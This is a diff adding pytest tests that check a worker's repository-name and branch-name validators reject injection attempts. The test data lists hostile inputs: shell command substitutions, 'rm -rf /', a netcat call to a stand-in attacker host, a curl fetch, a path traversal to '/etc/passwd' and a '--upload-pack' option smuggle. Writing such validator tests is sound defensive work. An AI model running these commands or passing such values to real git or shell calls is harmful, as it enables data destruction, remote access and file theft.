@@ -9,6 +9,8 @@ from unittest.mock import MagicMock, call, patch
 import pytest
 
 from worker.git_ops import (
+    _normalize_repo,
+    _validate_branch,
     apply_changes,
     cleanup_worktree,
     commit_and_push,
@@ -331,3 +333,43 @@ def test_apply_changes_delete_still_works(tmp_path: Path) -> None:
         f.write("x")
     apply_changes(root, [{"path": "gone.py", "action": "delete"}])
     assert not os.path.exists(victim)
+
+
+@pytest.mark.parametrize(
+    "evil",
+    [
+        "owner/repo$(id)",
+        "owner/repo`id`",
+        "owner/repo;rm -rf /",
+        "owner/repo|nc attacker 1",
+        "owner/repo&&curl evil.sh",
+        "owner/repo with space",
+        "owner/repo\nsecond-line",
+        "../../etc/passwd",
+        "only-one-segment",
+        "a/b/c",
+    ],
+)
+def test_normalize_repo_rejects_injection(evil: str) -> None:
+    with pytest.raises(ValueError, match="invalid repo"):
+        _normalize_repo(evil)
+
+
+def test_normalize_repo_accepts_valid() -> None:
+    assert _normalize_repo("https://github.com/eduardoaugustoes/cawnex.git") == (
+        "eduardoaugustoes/cawnex"
+    )
+    assert _normalize_repo("owner/repo_name.v2") == "owner/repo_name.v2"
+
+
+@pytest.mark.parametrize(
+    "evil",
+    ["feat/x;id", "--upload-pack=evil", "a..b", "br anch", "br\nanch", ""],
+)
+def test_validate_branch_rejects(evil: str) -> None:
+    with pytest.raises(ValueError, match="invalid branch"):
+        _validate_branch(evil)
+
+
+def test_validate_branch_accepts_wave_format() -> None:
+    assert _validate_branch("cawnex/w01-m01") == "cawnex/w01-m01"
